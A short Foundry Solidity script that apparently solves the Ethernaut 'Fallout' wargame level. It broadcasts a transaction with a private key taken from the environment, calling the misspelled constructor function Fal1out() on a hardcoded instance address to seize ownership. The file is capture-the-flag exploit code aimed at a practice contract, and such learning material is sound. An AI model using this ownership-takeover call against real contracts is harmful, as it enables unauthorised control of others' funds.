pragma solidity ^0.8.13;
import "forge-std/Script.sol";
import "../../src/interfaces/IFallout.sol";

contract FalloutScript is Script {

    function run() external {
        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        address targetAddr = 0xB70d81327359F0C44aBf561C97478a84C2Eb8d3A; // 替换为实例地址

        vm.startBroadcast(privateKey);
        IFallout target = IFallout(targetAddr);
        target.Fal1out();

        vm.stopBroadcast();
    }
}
